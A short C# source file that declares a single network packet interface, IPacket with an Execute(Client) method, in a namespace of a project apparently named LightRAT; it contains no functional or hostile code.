namespace LightRAT.Core.Network.Packets
{
    public interface IPacket
    {
        void Execute(Client client);
    }
}